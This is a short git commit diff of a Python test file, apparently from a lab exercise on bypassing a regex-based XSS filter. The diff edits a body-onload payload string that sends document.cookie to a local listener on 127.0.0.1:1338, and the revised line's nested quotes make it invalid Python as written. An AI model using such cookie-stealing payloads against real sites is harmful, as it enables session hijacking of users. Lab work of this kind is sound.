2b5d801fd1cf52037c27ddf44c53561f2d9095df
Ed Shao <ss5902@columbia.edu>
2019-11-10 16:48:21 -0500

    commit m

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import re
 
-comment = '<body onload=document.open("http://127.0.0.1:1338/xss/high?cookie=" + document.cookie)>'
+comment = '<body onload='document.location="http://127.0.0.1:1338/xss/high?cookie=" + document.cookie'>'
 print(comment)
 comment = re.sub(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t', '', comment, flags=re.IGNORECASE)
 print(comment)
